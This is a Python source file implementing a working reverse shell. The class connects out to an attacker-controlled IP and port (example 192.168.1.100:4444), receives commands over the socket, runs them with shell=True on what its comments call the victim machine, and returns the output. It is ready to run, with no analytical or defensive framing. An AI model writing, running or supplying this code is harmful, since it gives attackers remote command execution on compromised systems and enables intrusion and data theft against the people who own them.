import socket
import subprocess
import os
import sys

class ReverseShell:
    def __init__(self, attack_ip, attack_port):
        self.attack_ip = attack_ip  # IP address of the attacker's machine
        self.attack_port = attack_port  # Port on which the attacker is listening
        self.client_socket = None

    def create_reverse_shell(self):
        """
        Create a reverse shell that connects back to the attacker's machine.
        """
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.attack_ip, self.attack_port))
            print(f"Connected back to attacker at {self.attack_ip}:{self.attack_port}")
            
            # Execute commands from the attacker's side and send output back
            while True:
                # Receive command from the attacker
                command = self.client_socket.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    print("Exiting reverse shell.")
                    break
                elif command.lower().startswith("cd "):
                    # Change directory on the victim system
                    try:
                        os.chdir(command[3:])
                        self.client_socket.send(b"Changed directory")
                    except FileNotFoundError as e:
                        self.client_socket.send(f"Error: {e}".encode())
                else:
                    # Execute other system commands
                    output = self.execute_command(command)
                    self.client_socket.send(output.encode())
            self.client_socket.close()
        except Exception as e:
            print(f"Error while creating reverse shell: {e}")
            if self.client_socket:
                self.client_socket.close()

    def execute_command(self, command):
        """
        Execute a system command on the victim machine and return the result.
        """
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            return output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode('utf-8')}"

# Example usage
if __name__ == "__main__":
    attacker_ip = "192.168.1.100"  # Change to your attacker's IP address
    attacker_port = 4444  # Port to listen on
    shell = ReverseShell(attacker_ip, attacker_port)
    shell.create_reverse_shell()
